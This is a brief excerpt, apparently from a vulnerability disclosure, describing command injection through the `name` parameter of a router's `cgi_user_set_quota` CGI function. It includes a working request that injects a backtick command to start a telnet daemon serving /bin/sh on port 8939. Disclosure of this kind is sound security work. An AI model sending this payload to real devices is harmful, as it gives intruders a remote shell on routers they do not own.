...
In `cgi_user_set_quota` function, `name` is directly passed by the attacker, so we can control the `name` to attack the OS.
...
We set `name` as **`utelnetd -p 8939 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=cgi_user_set_quota&name=`utelnetd -p 8939 -l /bin/sh`&available1=&available2=
```
